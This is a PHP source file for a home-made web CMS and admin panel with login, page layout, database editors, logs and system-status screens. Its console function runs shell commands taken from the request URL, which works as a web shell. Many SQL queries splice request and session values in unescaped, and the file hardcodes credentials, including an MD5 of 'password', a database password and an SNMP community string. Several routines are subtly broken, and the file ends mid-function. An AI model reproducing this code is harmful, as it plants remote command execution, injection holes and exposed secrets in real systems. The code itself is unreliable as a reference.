
<?php

       //* *** buffer all output; HTTP1.1 HEADERS RFC2616 ***
       ob_start();

       header("HTTP/1.1 200 Ok");
       header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
       header("Cache-Control: no-cache, must-revalidate");

       define('__START_CLOCK__', floatval(microtime(true)));
       define('__FS_ROOT__', realpath($_SERVER['DOCUMENT_ROOT'].'/..'));
       define('__CONF__',getcwd() . "/" . "../etc/config.php");
       define('__SERIALIZED_CONF__',serialize(parse_ini_file(__CONF__,TRUE)));


       return(
               print("alpha").
               boot()
       );




 /*
       *
       *
       ******************************************************************************************


       ********************* ONLY ROUTINES BELOW
************************************************


       ******************************************************************************************
       *
       *
       */





       function _snmpwalk($i=FALSE){

               return(!is_guest()
                       ?       __static(
                               _,_screen(
                                       unix("snmpwalk -Os -OS -Of -Ot -c staff -v 1 192.168.32.29")
                               ),NULL
                       )       :       denied()
               );
       }

       function __luv_array($d=FALSE){
               $luv=NULL;
               if( intval($d) > 0 ){
                       if( is_dir($d) && is_readable( $d) ){
                               while( $a=scandir($d) ){
                                       if( ($a !== ".") && ($a !== "..") ){
                                               $luv.="$a:";
                                       }
                               }
                       }
               }
               return(!empty($luv)?serialize(explode($luv,":")):NULL);
       }


       function _top(){
               return(__static(NULL, _screen(
                       is_posix()
                               ?       unix("/usr/bin/top -aStHuPIbC -U $(whoami)|grep -v top")
                               : ( @system("tasklist") ? NULL : __LINE__ )
                       ), "System Status Report")
               );
       }



       function __out(){
               $stdio=NULL;
               $zid_sql="SELECT vhosts_id FROM zones ".
                       "WHERE name='{$_SESSION['zone']['name']}' LIMIT 1";
               if(mysql_num_rows(mysql_query($zid_sql))>0){
                       $vid=mysql_result(mysql_query($zid_sql),0);
                       $v_qry=mysql_query("SELECT * FROM vhosts WHERE id = '$vid'");
                       while($v=mysql_fetch_assoc($v_qry)){
                               $stdio=NULL.
                               head(
                                       title($v['title']).
                                       charset().
                                       css('default').
                                       ( (__==="denied")||(__==="logout")
                                               ? x("meta",NULL,
                                                       'http-equiv="refresh" content="10;url=/login/" '
                                               ):NULL
                                       ).x('link',NULL,
                                       'rel="shortcut icon" href="/favicon.ico" type="image/x-icon"')
                               ).
                               body(
                                       c("REMOTE ADDRESS:\t{$_SERVER['REMOTE_ADDR']}").
                                       "\n".layout()."\n",
                                       (_PIN==='console'?'onLoad="curFocus();"':NULL)
                               );
                       }
               }
               return dtd($stdio);
       }

       function botxt(){
               return __txt(
                       "User-agent: *\nAllow: /\nUser-agent: *\n".
                       "\nDisallow: /config\n".
                       "# Yahoo. too many repeated hits, too quick\nUser-agent: Slurp\n".
                       "\nDisallow: /yahoo\n");
       }
       function _etcconf(){
               $conf=unserialize(__SERIALIZED_CONF__);
               return(
                       __static("Current [../etc/config.php]",
                       str_replace("Array",NULL,printr($conf)),"etc/config.php")
               );
       }
       function rc(){
               define( "__TCP__",
                       (function_exists("net")?call_user_func("net"):FALSE)
               );
               define( "__XML__",
                       (function_exists("div")?NULL:call_user_func("element_as_routine"))
               );
               if(!file_exists(getcwd()."/.htaccess"))write_htaccess();
               $ini=parse_ini_file(getcwd().'/../etc/config.php',true);
               define('TLD',$ini['dns']['tld']);
               define('DIR',$ini['dir']['root']);
               define('SUP',$ini['usr']['janitor']);
               define('OPP',$ini['usr']['operator']);
               define('__ENTITY__',$ini['dir']['entity']);
               $dbx=mysql_connect('localhost',$ini['usr']['dbu'],'123');
               $dbn=mysql_select_db(str_replace('.','_',get_zone()),$dbx);
       }
       function init(){
               if(@session_start()){
               $_SESSION['zone']['name']=!ip4(get_zone())?get_zone():TLD;
               $_SESSION['zone']['id']=$i=intval(get_zone_id())?$i:NULL;
               $_SESSION['guest']=guest();
               $_SESSION['usr']=!empty($_POST['login'])?login():load_usr(get_usrn());
               $_SESSION['ver']=serialize(explode("_",__VERSION__));

               if(is_user())loglogin(); // write atime time
               define('ZONE',$_SESSION['zone']['name']);
               define('ZID',$_SESSION['zone']['id']);
               define('UID',get_uid());define('GID',get_gid());
               define('USER',get_usrn());define('GROUP',get_grpn());
               define('FORM',' action="/" method="post"');
               define('MAX_FILE_SIZE',intval(1073741824));
               define('TABLE',' cellspacing="3" cellpadding="2" border="0" width="100%"');
               define("OK",span("+OK:"),cl("ok"));
               define("ERR",cl("e"));
               define('SEAL',
                       'cursor:default;position:absolute;top:1px;left:1px;z-index:9;'
               );
               // query parsing and passing form post on through
               $_=empty($_POST['pin'])?request():$_POST['pin'];define('_',$_);
               define("__",str_replace("/","",_));
               define('_PIN',str_replace("/","",str_replace("_"," ",_)));
               // Kirk: Scotty... (posix only)
               $_SESSION['SCOTTY']=is_posix()?sys_getloadavg():FALSE;
               define('MARKER',' style="'.SEAL.'color:#ddd;font-size:16px;"');
               return true;}else{die("-ERR: :".__LINE__);}
       }


       function _about(){return(_top());}
       function boot(){
               /* **
               Parse cf on FS, compile compiler for element assembly
               /* **   */
               $rc = intval(loader()) == TRUE
                       ? call_user_func("__element_as_routine")
                       : exit("loader() ain't worth much :: FALSE");
               $gb=get_browser(NULL,true);
               /* if(!is_readable(__CONFIG__)) {
                       exit(__FILE__.':'.__LINE__.':'.'..FIXME'); //write_ini_file();
               } else */ @rc(__CONFIG__);
               /* ** */

               //* HTTP stdio stream dependant upon internal DENY and INIT routines
               $deny=parse_ini_file(__FS_ROOT__.'/.deny');
               foreach($deny as $kline) {
                       if(strstr($kline,substr($_SERVER['REMOTE_ADDR'],0,6))) {
                               exit("Would you know why IPv4: ".
                               "{$_SERVER['REMOTE_ADDR']}" ." has been klined?\r\n");
                       }
               }
               if( init()>0 ){
                       $init=output(
                               ( intval(__ALLOW_LOGIN__)>0
                               ?( "{$_SERVER['REMOTE_ADDR']}"===__AUTHOR__
                                       ? __out()
                                       : nologin()
                               ):__out()
                       )
               );
       } else {
               $init=output( span(date("Y/m/d HH:i").":".__LINE__,'
style="font-family:monospace;"'));
       }
}


function loader(){
$cf=parse_ini_file(getcwd().'/../etc/config.php',true);
$fs=stat(__FILE__);
$conf=array(
       "sqldate"       =>date('Y-m-d H:i:s'),
       "runlevel"=>intval(0),
       "mycell"        =>"703.545.670".rand(2,9),
       "rcconf"        =>"../etc/config.php",
       "server"        =>'76.27.6.33', // ip of server
       "client"        =>'76.27.6.33', // ip for init(0)
       "passwd"        =>"5f4dcc3b5aa765d61d8327deb882cf99", // password
       "plugin"        =>".luv",
       "xhtml"=>
               'address:body:blockquote:button:code:div:dd:dt:em:frameset:fieldset:form:'.
               'h1:h2:h3:h4:h5:h6:head:html:i:iframe:legend:li:noframes:noscript:object:ol:'.
               'option:p:pre:select:script:span:strong:style:td:textarea:th:title:tr:tt:ul:u'
);

define("__DATE__",$conf['sqldata']);
define("__XHTML__",$conf['xhtml']); // depricate this
$constant_a=array(
'__SRVIP__'=>empty($_SERVER['SERVER_ADDR'])?FALSE:$_SERVER['SERVER_ADDR'],
'__RADDR__'=>empty($_SERVER['REMOTE_ADDR'])?NULL:$_SERVER['REMOTE_ADDR'],
'__POSIX__'=>is_posix(),
'__LUSER__'=>is_posix()?(intval(exec('id
-u'))<1?exit("UID0!".__LINE__):exec('id -un')):'luser',
'__SERIAL__'=>base_convert($fstat[9],10,12)."_02",
'__VERSION__'=>"0.0_0.0_0.0_0.0_0.2_G",
'__UNAME__'=>'Federal Code Source',
'__MYBOX__'=>$cf['client'],
'__SRCIP__'=>$cf['server'], // ip to match against SRVIP
'__RUNLEVEL__'=>($cf['runlevel']>1?'(1:multiuser)':'(0:singleuser)'),
'__SOURCE__'=>'index.txt',
'__FREEZE__'=>(is_posix()?'/tmp/freeze.txt':NULL),
'__UPDATE__'=>(is_posix()?'/tmp/update.txt':NULL),
'__UMASK__'=>'0022',
'__TMPFS__'=>(is_posix()?getcwd().'/../tmp/._localhost':NULL),
'__ALLOW_LOGIN__'=>$cf['runlevel'],
'__PASSWD__'=>$cf['passwd'],
'__RCCONF__'=>getcwd()."/{$cf['rcconf']}",
'__PLUGIN__'=>getcwd()."/{$cf['plugin']}",
'__SUPPORT__'=>phone_number($cf['mycell']),
'__PHI__'=>((sqrt(5)+1)/2));
       if(function_exists('define_a')) define_a($constant_a);
       else foreach($constant_a as $c=>$d) define($c,$d);
       unset($fs,$cf,$constant_a);//security cleanup ;)
       // We got this far so we will return true!
       return true;
}

function output($r=NULL){
return !empty($r)?print("{$r}"):__FUNCTION__.'(): '.__LINE__;}



function __input_request(){
       return(
               form(
                       div(input(NULL,"x",__)).
                       div(input("text",$n,$v)).
                       div(input("submit","button",$b)),
                       'action="/" method="get"'
               )
       );
}


function layout($header=NULL,$body=NULL,$tail=NULL){
$header=!is_null($header)?$header:logo().(__==="login"?NULL:_login_box());
$body=!is_null($body)?$body:content();
$tail=!is_null($tail)?$tail:tail();
return div(div(div(table(
tr(
td(nbsp(),cl('header-left'))."\r\n".
td(div($header.div('',cl('fixed-width')),cl('content-head')),cl('header-middle')).
td(nbsp(),cl('header-right')))."\r\n".
tr(
td(nbsp(),cl('body-left'))."\r\n".
td(div($body,cl('content-body'),css_str('width:100%;')),cl('body-middle')).
td(nbsp(),cl('body-right')))."\r\n".
tr(
td(nbsp(),cl('footer-left'))."\r\n".
td(div(div($tail,cl('c-foot-wrap')),cl('content-foot')),cl('footer-middle')).
td(nbsp(),cl('footer-right'))
),' width="100%" cellpadding="0" cellspacing="0" border="0"'
), cl('footer')), cl('header')), cl('body'));}

function tail($hrefs=NULL){
$valid =' href="http://validator.w3.org/check?uri=referer"
'.css_str('color:#aaa;');
$spc=nbsp().'|'.nbsp();
$hrefs=is_null($hrefs)?
'| '.
a('Home',' href="/"').$spc.
a('About',' href="/about/"').$spc.
a('Login',' href="/login/"').$spc.
a('Contact',' href="/contact/"').$spc.
br().br().div(round(runtime(),3).'ms @ '.
               (intval(abs(lines()/(runtime()*1000)-1000)+100)/1000).'kHz '.br().
               (bytesize(filesize(__FILE__)).' '.number_format(lines()).'L')
       ,'style="color:#aab;font-size:0.8em"')
:p("$hrefs");
//.$spc.a('ToDo',' href="/todo/"')
return div($hrefs,css_str('padding:0.3em;text-align:center;'));}
function logo(){
$zone_logo=strrev(substr(strrev(ZONE),4));
$logo=($zone_logo==="littleredcan")
?div(span("Federal Bureau".span(" of ",'style="text-transform:lowercase;"')
,'style="color:#000;"').br().
span("Communications ",'style="color:#c31;"').span(" and
",'style="text-transform:lowercase;"').
span("Broadcasting
",'style="color:#05c;"'),'style="letter-spacing:0.11em;color:#000;text-align:right;"')
:$zone_logo.'&trade;';return "\n\n".
div(strong(a( ucfirst( $logo ),' href="/"
'.(__==='login'?'id="logo"':NULL))),'class="logo"')."\n\n";}


function exe($str=NULL,$m=NULL,$f=NULL){
$m=is_null($m)?"post":"get";
return form($str,'action="/" method="'.$m.'"'.(is_null($f)?NULL:" $f"));}
function exe_insert($pin=NULL){
       return!is_null($pin)
       ?exe(div(input(NULL,"pin","$pin")).div(input(NULL,"x","i")).
               div(input("submit",NULL,"New ")))
       :NULL;
}
function qry_insert($pin=NULL){
       $name=!empty($_POST['name'])?mysql_escape_string($_POST['name']):'whats
my name?';//unique this later
       $id=mysql_query("INSERT INTO $pin (ctime,name)
VALUES(NOW(),'$name')")?mysql_insert_id():FALSE;
       $return=intval($id>0)?intval($id):span(__LINE__,ERR);
       return!is_null($pin)?$return:NULL;
}
function exe_select($pin=NULL,$sel=NULL,$new=FALSE){
       return!is_null($pin)
       ?legend(span(strtoupper(substr($pin,0,1)),css_str("text-decoration:underline;")).substr($pin,1,strlen($pin))).
               exe(div(input(NULL,"pin",$pin)).div(input(NULL,"x",'s')).
               div((is_null($sel)?select(option("--SELECT--")):$sel)).
               input("submit","button","Open...")).($new>0?exe_insert($pin):NULL)
       :NULL;
}
function qry_select($pin=NULL,$where=FALSE){
       @$id=intval($_POST["{$pin}_id"])>0?intval($_POST["{$pin}_id"]):FALSE;
       $where=$where>0?" ".$where:NULL;
       if(!is_null($pin)){
               $q=@mysql_query("SELECT id,name FROM $pin $where");
               $n=@mysql_num_rows($q);
               if($n>0){
                       $opt=option("-- SELECT --",NULL);
                       while($s=mysql_fetch_assoc($q)){
                               $sel=$id==$s['id']?' selected="selected"':NULL;
                               $opt.="\n\n".option(stripslashes($s['name']),' value="'.$s['id'].'"'.$sel);
                       }
               }$s=@select($opt,'name="'.$pin.'_id" '.css_str('width:20em;').'
onchange="this.form.submit();"');
       }else $s=span("No $pin found!",ERR);
       return $s;
}
function exe_delete($pin=NULL,$id=FALSE){
       return!is_null($pin)
       ?exe(div(input("hidden","pin",$pin)).div(input(NULL,"x","d")).
               div(input(NULL,$pin."_id",$id)).div(input("submit",NULL,"Delete")))
       :NULL;
}
function get_isp(){
$isp_a=!empty($_SERVER['REMOTE_HOST'])
       ?       explode('.',strrev($_SERVER['REMOTE_HOST']))
       :$_SERVER['REMOTE_ADDR'];
return @strlen(strrev($isp_a[1]))>0?'| '.strtoupper(strrev($isp_a[1])):NULL;}
function you(){
$u=get_browser(NULL,true);
return div(span(
       span($u['browser']." ".round($u['version']))." | ".
       span($u['platform']." | {$_SERVER['REMOTE_ADDR']}").nbsp().get_isp()
),' style="font-style:monospace;font-size:0.8em;"');}
function identd(){
$fp=fsockopen($_SERVER['REMOTE_ADDR'], 113, $errno, $errstr, 30);
       if (!$fp) {
               echo "$errstr ($errno)<br />\n";
       }else{
               $out = "GET / HTTP/1.1\r\n";
               $out .= "Host: www.example.com\r\n";
               $out .= "Connection: Close\r\n\r\n";
               fwrite($fp, $out);
               while (!feof($fp)) {
                       echo fgets($fp, 128);
               }
               fclose($fp);
       }
}
function php($e=NULL){!empty($e)?eval('?'.'><'.'?'."php\n\n{$e}"):exit(__LINE__);}
function __txt($s=NULL){return!empty($s)?(php("ob_start();header(\"Content-Type:text/plain\");print(trim(\"{$s}\"));exit(ob_get_clean());")):FALSE;}
function _httpd($c=0){
if(!empty($_REQUEST)){
       if(!empty($_REQUEST['n'])){
               $c=intval("{$_REQUEST['n']}")>0?intval("{$_REQUEST['n']}"):10;
       }
}
$log="/usr/www/var/error.log";
$c=($c>0?intval($c):4);
$form=form(div(input(NULL,"x",__)).div("Show ".
input("text","n",$c,'class="clean" style="width:4em;"').nbsp().
input("submit","button","lines")));
return __static("HTTP Server ERRORS",$form.div(code(span("Last {$c}
lines of $log last viewed ".date('Y-m-d H:i:s'),'class="alert"'))).
_screen(unix("/usr/bin/tail -n {$c} $log|grep -v 'jrey'|/usr/bin/fold
-w 108")),code("HTTP Server Error Log"));
}

function _soa(){
       return(
               __static(get_zone() ." SOA(Start of Authority)
record",_screen(NULL,unix("dig -t SOA\n".get_zone())),NULL)
       );
}

function _ascii(){
$ascii=''.
'LZVnU9RgFEa/51c8CmKh5Sa7KQoIiBV777olCwguagDF9ts9N9eZzJzJh3fPwjxnX6WppscHSk3t4a7S'.
'TO3RD6W5GkdPzeGR0r6a6VelhQajfaWlhs1BorTSsJXSWrtHYKDpARjqxN9Gmn4BY42+gYbPBhO1e4ks'.
'1figkZnGI5NlIJPlIJf1QE/W13SwLyvUnk5lJV9myMFKowGvtZrPkg3UHg9lQzXtSDbShC9jY+04Gn1z'.
'THTcJspStXyZzKQzIJPOglyaAT1pFvSlc6CQ5kApnedcJV3grZYugoF0CQyleTCSFsBYWgSNtAQm0nKi'.
'POVvlXJ8PDk+nhyfP/h4cnw8OT6eHF/JOXw8OT6eHN9lgO8KwLcC8K0CfGsA39VEPWTrfCyyDYBsEyC7'.
'BpBtAWTXAbIbAN9NziG7xRuy2wDfHYBvG+C7C/DdA/juA3wPEvXxPeT743sE8D0G+J4AfE8BvmcA33OA'.
'7wXn8L3kDd8rgO81wPcG4HsL8L0D+N4DfB8SFfg+8o/Cx5kCH2cKfJwp8HGmwMeZAh9nCnw7nMO3yxu+'.
'PcDZT4Cz+4CzzLXgLFsqODsFnD1MVOJjLyW+rwAfGy7xMakSH/su8R0DfCcA33fO4fvBG75TgO8nwPcL'.
'4PsN8P0B+P6CicaUlPhcvEFFg4oGFQ0qGlQ0qGhQ/xtUNKhokLK8QcryBinLG6Qsb5CyvEHK6hososEy'.
'GqyiwbprkFy8QXLxBsnFG8zyaJBevEF68QbpxRukF2+QXrxBevEGqcAbpAJvkAq8Qa/gTFRwNiqYiQpm'.
'owIa9ArmooLzse0Lse2Lse1Lse352PZCbHsxtr0U216ObaexbY76YrNYbB6L7cVi+7HYIhZLg77YKhbL'.
'UV/s5VgsDfoOV2KHq7HDtdghDfoO12OHG7HDzdghDfoOt2KHNOjruhHrokFf161Y1+1Y151Y13as626s'.
'iwZ9XfdjXTRYRYNVNFhFg1U0WEWDVTRYRYNVNFhFg1U0WKddg7V1DdZZ12Cddw3Wva7But81WBddg3XZ'.
'NVhXXYN17Q0aNwgNGjcIDRo3CA0aNwgNGjcIDRo3CA0aNwgNGjcIDRoXCA0aFwgNGuOlQWO8NGiMlwaN'.
'8dKgMV4aNMZLg8Z4adAYLw0a46VBY7w0aIyXBs1/609B5g2a/9b/Aj1v0Py3/g8ovEFju97gPw==';
if($_REQUEST['debug']==TRUE){
return(__static(NULL,_screen($ascii),NULL));
}else{
return div(titlebar(strtoupper("American Standard Code for Information
Interchange")).fieldset(
legend("Hexadecimal and Decimal ".
a("ASCII",' href="http://en.wikipedia.org/wiki/ASCII"
style="font-weight:bold;text-decoration:underline;color:#007;"
target="_blank"')." character sets").
_screen(gzinflate(base64_decode($ascii))),cl("set")),cl("f"));}}
function content(){
/*      returns included content based on REQUEST_URI parsed and defined as
an underscore
 *      defaults to 'home' and handles /logout/, /tmp/ wrapper for content
div() forces menu()
 */
$content=is_callable('_'.str_replace('/','',str_replace('.','_',_)))
?'_'.str_replace('/','',str_replace('.','_',_)):'home'; // <-- failsafe page
switch(_){ case strstr(_,'/logout/'):logout();break;case
strstr(_,'/robots.txt'):botxt();break;case
strstr(_,'/tmp/'):tmp();break;}
return div(div(menu(),cl("menu")).$content(), cl('c-body-wrap'));}
function request(){$r=@parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH);return($r==='/')?'home':$r;}
function __static($l=NULL,$s=NULL,$h=NULL){
       $h=!empty($h)?h1("<a
href=\"http://".ZONE."/".__."/\">".$h."</a>",'class="heading"')
               :h1("<a href=\"http://".ZONE."/".__.'/">'.__."</a>",'class="heading"');
       $l=empty($l)?legend(ucfirst(__)):legend($l);
       $s=empty($s)?$s:substr(stripslashes($s),0,65536);
       return div($h.fieldset( $l.$s, 'class="set"'),'class="f"');}
function __dynami(){
       $post=mysql_escape_string($_POST['return']);
       $form=exe(div(input(NULL,"pin",__)).div("form return:
".input("text","return",(!empty($post)?$post:NULL)).nbsp().input("submit",NULL,"!")));
       $return=!empty($post)?$post:NULL;
       return div(fieldset(legend(ucfirst(__)).$return.hr().$form.hr(),'class="set"'),'class="f"');}
function _login(){return __static(ucfirst(__),div(
'Remember the email address you submitted and verified is also your
username.','style="display:inline;"')._login_box(),you());}
function define_a($a,$s=NULL){foreach($a as $k=>$v){$n=($s?$s."_":"").$k;
//parses two dimentional array as defined constants
if(is_array($a[$k]))call_user_func(__FUNCTION__,$a[$k],$n);else define($n,$v);}}
function __get_screen_height($s=0){$s=$s>0?$s:0;$n=intval(count(explode("\n",$s)));
$h=($n>37)?32:($n<6?10:intval($n));return($h."em;");}
function perms($u=FALSE,$t=FALSE){
// Returns decimal permissions parsed from octal from umask
$exe=intval(0777,8);$reg=intval(0666,8);
$type=$t>1?$exe:$reg;$umask=($u<1)?__UMASK__:$u;
$perms=intval($type-intval(__UMASK__,8));
return decoct($perms);}
function is_posix(){$return=!empty($_SERVER['SERVER_SOFTWARE'])
//Is server POSIX, defined as NOT windows
?(strstr("Windows",$_SERVER['SERVER_SOFTWARE'])?FALSE:true):NULL;
return $return;}
function usr_posix(){$ua=get_browser(NULL,true);
/*
 * Of course, useragent on a non windows box is not truly a definiative
 * POSIX but windows isn't and there isn't much else to go on
 */
return stristr($ua['browser_name_pattern'],'windows') ? FALSE : true;}
function discriminate(){
       /*
       if(
               ($gb['browser']!="Firefox")&&
               ($gb['browser']!="IE")&&
               ($gb['browser']!="Default Browser")
       )define('UA',$gb['browser']);
       /* * */
}
function logging(){
       $post = !empty($_POST)?serialize($_POST):(!empty($_REQUEST)?serialize($_REQUEST):NULL);
       $useragent = serialize(@get_browser(null,true));
       $query = !empty($_SERVER['REQUEST_URI'])?parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH):NULL;
       $user_id = get_uid();
       $sql="INSERT INTO logs (post,useragent,query,user_id,ip,datetime)
VALUES ('$post','$useragent','$query','$user_id','{$_SERVER['REMOTE_ADDR']}',NOW())";
       $id = mysql_query($sql) ? mysql_insert_id() : FALSE;
       return $id;
}
function _console(){
if(get_gid()>5)denied();
$window=NULL;
$action=' action="/console/" method="get" '.css_str('margin:0px;');
$query=empty($_SERVER['REQUEST_URI'])?NULL:parse_str($_SERVER['REQUEST_URI']);
$cmd=empty($cmd)?NULL:stripslashes($cmd);
$stdio=empty($cmd)?NULL:htmlentities(`$cmd`,ENT_QUOTES,"UTF-8");
$output=str_replace( br(), div(NULL,css_str("border:bottom solid 1px
#888;")).br(), $stdio );
$header=NULL; //span(exec("uname -sn"),cl("info"))."\n\n";
$d=240;//(intval(($d=intval(count(explode($output,"\n")))>31?32:intval($d)))<10?4:$d).'em;';
// http://www.w3.org/TR/CSS2/ui.html
$console=
div( titlebar(exec('uname').nbsp().strtoupper(__FUNCTION__).' on '.
       span(strtoupper(strrev(substr(strrev(ZONE),4,100))))).
_screen('['.__LUSER__.':'.exec('id -u').']% '.$cmd,$output,$header).
div(form(
       div(input('hidden','console','true')).
       div(nbsp().get_usrn().' # '.
               input('text','cmd',NULL,cl("cmd").' '.
                       css_str('border:inset 1px
#555;background-color:#9397a5;width:14em;')//.' tabindex="1"'
               ).nbsp().input('submit',NULL,'!',
       css_str('font-size:1.61em;'))
),css_str('padding:2px;'),' name="consoleForm"'.$action )),cl('console'));
return $window.div( div($console,' class="floatingWindowContent"'),'
id="window3"');}
function _whoami(){return _screen("whoami\n",who());}
function _array($a=FALSE){if(is_array($a))$r=_screen(print_r($a,true));else
$r=(NULL);return $r;}
function _session(){
return(__static('Current session name value
pairs',_screen(print_r($_SESSION,TRUE)),"SESSION Array"));}
function _screen($cmd=NULL,$stdio=NULL,$h=NULL,$size=NULL){
$cmd=is_null($cmd)
       ?       implode($_SESSION['SCOTTY'],nbsp()):$cmd;
$color=is_guest()
       ?'background-color:#12a;color:#ee8;'
       :'background-color:#9397a5;color:#000;background-image:url(/css/sys/screen.gif);';
$stdio= str_replace("\r\n","\n",str_replace("\t",nbsp(2),$stdio));
$height=empty($stdio)?'8em;':__get_screen_height($stdio);
$return =div(div(
       $h. pre( "$cmd\n". $stdio,css_str('margin:0px;padding:0px;')." ".cl("screen")),
       css_str('overflow:auto;border:inset 1px
#555;font-size:8px;font-family:Terminal,monospace;'.$color.$height)
),css_str('border:solid 3px #d7cde0;'));
return div( $return);}
function csvfs(){
define("DB_TYPE","csvfs");
define('TLD', (!empty($_SERVER['HTTP_HOST'])?str_replace('www.','',$_SERVER['HTTP_HOST']):NULL));
define('DIR',getcwd());define('SUP',__PASSWD__);define('OPERATOR',__PASSWD__);}
function write_htaccess(){
$s="RewriteEngine On\nRewriteRule".' !^(.*\..*) '."/index.php\n";
$f=getcwd() . '/.htaccess';
$ed = array('200','302','400','401','403','404');
foreach($ed as $line){$s.="ErrorDocument ".$line." /\n";}
if(!file_exists($f)||filesize($f)<1)$s=@file_put_contents($f,$s);}
function write_ini_file(){
$cwd=(getcwd()===$_SERVER['DOCUMENT_ROOT'])?getcwd():exit(__LINE__);
$eof=!file_exists(__RCCONF__.'.dist')?
"; sample ../etc/config.ini\n".
"[dir];\tdir with index.php\nroot=\"$cwd\"\n\n".
"[usr];\tmd5'd passwords, tis better than nothing now\n".
"janitor=\"\";\tjanitor is root\noperator=\"\";\tas root\n".
"; database flags\ndbu=\"\"\ndbp=\"\"\n\n".
"[dns];\thostname\ntld=\"example.com\"\n".
"db=\"db.example.com\"\n":file_get_contents(__RCCONF__.'.dist');
return !file_exists(__rcconf__)?file_put_contents(__RCCONF__,$eof)?FALSE:'created':true;}
function bytesize($size,$round=FALSE){
$round=(intval($round)>0)?$round:1;
$b=array('','kB','mB','gB','tB','pB','eB');
foreach($b as $v){if($size>1024){$size=$size/1024;}else{break;}}return
round($size,$round)."$v ";}
function phone_number($phone){$phone=preg_replace("/[^0-9]/", "",$phone);
if(strlen($phone)==7) return preg_replace("/([0-9]{3})([0-9]{4})/",
"$1-$2", $phone);
elseif(strlen($phone)==10)return
preg_replace("/([0-9]{3})([0-9]{3})([0-9]{4})/", "($1) $2-$3",
$phone);
elseif(strlen($phone)==11)return
preg_replace("/([0-9]{1})([0-9]{3})([0-9]{3})([0-9]{4})/", "($2)
$3-$4", $phone);
else return $phone;}

function getsign($date){
$sign=array(
"Aquarius","Pisces","Aries","Taurus","Gemini","Cancer","Leo","Virgo","Libra","Scorpio","Sagittarius","Capricorn");
list($year,$month,$day)=explode("-",$date);
if(($month==1 && $day>20)||($month==2 && $day<20)){return "Aquarius";
       }else if(($month==2 && $day>18 )||($month==3 && $day<21)){return "Pisces";
       }else if(($month==3 && $day>20)||($month==4 && $day<21)){return "Aries";
       }else if(($month==4 && $day>20)||($month==5 && $day<22)){return "Taurus";
       }else if(($month==5 && $day>21)||($month==6 && $day<22)){return "Gemini";
       }else if(($month==6 && $day>21)||($month==7 && $day<24)){return "Cancer";
       }else if(($month==7 && $day>23)||($month==8 && $day<24)){return "Leo";
       }else if(($month==8 && $day>23)||($month==9 && $day<24)){return "Virgo";
       }else if(($month==9 && $day>23)||($month==10 && $day<24)){return "Libra";
       }else if(($month==10 && $day>23)||($month==11 && $day<23)){return "Scorpio";
       }else if(($month==11 && $day>22)||($month==12 && $day<23)){return
"Sagittarius";
       }else if(($month==12 && $day>22)||($month==1 && $day<21)){return "Capricorn";}
}

function __color(){
if(date('H')<23 )       $c='#117;';
if(date('H')<21 )       $c='#444;';
if(date('H')<18 )       $c='#c91;';
if(date('H')<15 )       $c='#c80;';
if(date('H')<10 )       $c='#01a;';
return $c;}
function home(){
$data=wordwrap(htmlspecialchars(trim($random)),80,"\n",true);
$q=@mysql_query("SELECT content FROM pages WHERE name = '".__."' AND
deleted > 0");
$d=mysql_num_rows($q)>0 ? mysql_result($q,0) : NULL;
$qq=@mysql_query("SELECT eval FROM pages WHERE name = '".__."' AND
deleted > 0");
return is_guest()? (!empty($d)?__static(date("l, F jS, Y").
nbsp().strtoupper(getsign(date('Y-m-d'))),"$d",
div(__ENTITY__,'style="height:1.61em;background-color:'.__color().'visibility:hidden;"')):__static(NULL,__)
):NULL;}

function _editor(){ return _code(_PIN); }
function _code($p=NULL){


$debug=NULL;//_array($_POST);
$return=NULL;
$pin=is_null($p)?_PIN:$p;$user_id=UID;
$pin_id=!empty($_POST["{$pin}_id"])?intval($_POST["{$pin}_id"]):FALSE;
// insert
if(!empty($_POST['pin'])&&$_POST['x']=='i')$pin_id=intval(qry_insert($pin));
// delete
if(!empty($_POST['pin'])&&$_POST['x']=='d')$return.=mysql_query("UPDATE
$pin SET deleted='1' WHERE id = '$pin_id'")?OK:span(__LINE__,ERR);
// update
if(!empty($_POST['pin'])&&$_POST['x']=='u'){
       $name=!empty($_POST['name'])?mysql_escape_string(addslashes($_POST['name'])):NULL;
       $data=!empty($_POST['data'])?mysql_escape_string($_POST['data']):NULL;
       $return.=mysql_query("UPDATE $pin SET name='$name',data='$data' WHERE
id='$pin_id'")?OK:span(__LINE__,ERR);
}
//select_box
if($sel=
       qry_select($pin," user_id='$user_id' AND deleted='0'".
       (intval($pin_id)>0?" AND id='$pin_id'":NULL))
)$return.=fieldset(exe_select(_PIN,$sel,true),cl("set"));
//update box
if($pin_id>0){
       $qry=mysql_query("SELECT * FROM $pin WHERE id = '$pin_id' AND deleted='0'");
       //update access time
       $a_qry=mysql_query("UPDATE $pin SET atime = NOW() WHERE id = '$pin_id'");
       while(${_PIN}=mysql_fetch_assoc($qry)){
               $return.=
               fieldset(legend("Modifying: ".${_PIN}['name']).
                       exe(
                       div(input(NULL,"pin",_PIN)).
                       div(input(NULL,"x","u")).
                       div(input(NULL,_PIN."_id",${_PIN}['id'])).
                       span("Name: ").input("text","name",${_PIN}['name'],css_str("width:20em;").cl("clean")).nbsp(2).
                       div(
                               @span(strong("Created: ".${_PIN}['ctime'])).nbsp(2).
                               @span(strong("Accessed: ".${_PIN}['atime'])).nbsp(2).
                               @span("Modified: ".${_PIN}['mtime'],cl("e"))
                       ,css_str('font-size:0.8em;')).
                       div(textarea(stripslashes(${_PIN}['data']),
                               ' name="data" rows="0" cols="0" style="width:100%;height:200px;"
'.cl("clean")
                       )).
                       div(input("submit",NULL,"Save"))).exe_delete(_PIN,${_PIN}['id']),cl("set"));
       }
}return div(titlebar(_PIN).$return.$debug,cl("f"));}
function _logs(){
$return = is_guest() ? denied() : NULL;
$th = tr( th("User") . th("IP") . th("Query") . th("Date Time") );
$td = NULL;
$sql = "SELECT * FROM logs ORDER BY datetime DESC LIMIT 20";
$qry = mysql_query($sql);
while($l = mysql_fetch_assoc($qry)){
       $user = get_usrn($l['user_id']);
       $td .= tr(
               td($user) . td($l['ip']) . td($l['query']) . td($l['datetime'])
       );
}
$return .= div(
       titlebar(__FUNCTION__).
       fieldset(legend(date("r",time())).
       table( $th . $td, TABLE ),cl("set")),cl("f")
);return $return;}
function _password(){
if(!empty($_POST['pin'])){
       if(is_email($_POST['email'])){
               $gen=substr( strtoupper(md5(__DATE__)), rand(0,4),rand(2,7) );
               mail($_POST['email'],__FUNCTION__,$gen);
       }
}
